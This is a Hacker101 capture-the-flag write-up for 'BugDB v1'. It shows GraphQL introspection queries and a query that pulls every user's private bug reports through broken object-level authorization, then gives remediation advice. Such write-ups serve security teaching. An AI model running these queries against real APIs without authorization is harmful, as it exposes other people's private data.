# BugDB v1 — Writeup (1/1)

**Difficulty:** Easy  
**Category:** Web, GraphQL  
**Flags:** 1/1 (complete)  
**Platform:** Hacker101 CTF

---

## About the Challenge

**Context:** A GraphQL bug reporting API. Users can report public and private bugs. The flag is in a private bug from another user that should not be accessible.

**What you face:** A GraphQL endpoint with no visible documentation. The schema must be discovered via introspection, and the correct query to access private bugs from other users must be constructed.

**Vulnerabilities exploited:**
- Unrestricted GraphQL Introspection (OWASP API9) — exposes the complete schema including available types and queries
- Broken Object Level Authorization / BOLA (CWE-639) — `allUsers` returns private bugs from all users without checking authentication

**What you learn:**
- GraphQL introspection should be disabled in production (`__schema`, `__type`)
- The query `{ user { edges { node { bugs { edges { node { text private } } } } } } }` is the canonical path to exfiltrate private bugs
- BOLA in GraphQL occurs when resolvers do not verify whether the current user has access to the object
- Tools like Altair or Insomnia facilitate GraphQL exploitation with autocomplete via introspection

---

## Objective

Exploit the GraphQL API without authentication to extract sensitive data (private bug reports).

## Prerequisites

- Active BugDB v1 instance
- Any HTTP client or GraphQL tool (Burp Suite, GraphiQL, curl)

---

## Flag 0 — GraphQL Introspection + Data Exfiltration

**Vulnerability:** Introspection enabled in production + absence of field-level access control.

### Step 1: Schema discovery via introspection

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

Returns all available types in the schema.

### Step 2: Map available fields on the Query type

```graphql
query {
  __type(name: "Query") {
    fields {
      name
      description
      args {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
      type {
        name
        kind
        ofType {
          name
          kind
        }
      }
    }
  }
}
```

### Step 3: Extract all users and bugs (including private ones)

```graphql
query {
  user {
    edges {
      node {
        id
        username
        bugs {
          pageInfo {
            startCursor
            endCursor
          }
          edges {
            cursor
            node {
              id
              reporterId
              text
              private
              reporter {
                id
              }
            }
          }
        }
      }
    }
  }
}
```

The `text` field of private bugs (`private: true`) contains the flag.

### Alternative: list users first

```graphql
query {
  allUsers(first: 5) {
    edges {
      node {
        id
        username
      }
    }
  }
}
```

---

## Lessons Learned

1. **Introspection in production** exposes the entire API structure
2. **Absence of field-level authorization** allows reading private data without authentication
3. **GraphQL Relay pattern (edges/nodes)** requires adapted queries to correctly extract data
4. **Fields marked `private: true`** are semantically private but technically accessible without authorization

## Remediation

- Disable introspection in production
- Implement field-level authorization
- Validate user permissions before returning private data
- Add rate limiting and query complexity limits
